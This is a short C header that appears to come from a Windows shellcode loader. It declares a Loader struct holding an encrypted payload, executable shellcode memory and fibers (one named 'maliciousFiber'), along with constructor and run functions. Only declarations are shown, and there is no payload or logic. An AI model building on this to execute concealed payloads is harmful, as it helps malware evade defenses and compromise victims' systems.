#pragma once

#include "lucky_cipher.h"
#include "lucky_jitd.h"
#include "my_kernel32.h"
#include "my_ntdll.h"
#include <windows.h>

#define ALIGN16(x) (((x) + 15) & ~15)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _Loader {
  SIZE_T payloadSize;
  SIZE_T allocSize;       // size of allocated shellcode memory
  LPVOID shellcodeMemory; // executable memory for payload

  LPVOID fiber1; // fiber handles
  LPVOID fiber2;
  LPVOID maliciousFiber;

  unsigned char *encryptedPayload;
  // HANDLE hThread; //the thread of the loader
} Loader;

extern __thread Loader *g_loader;

Loader *newLoader(unsigned char *encryptedPayload, SIZE_T size);
void LuckyRun(Loader *l);
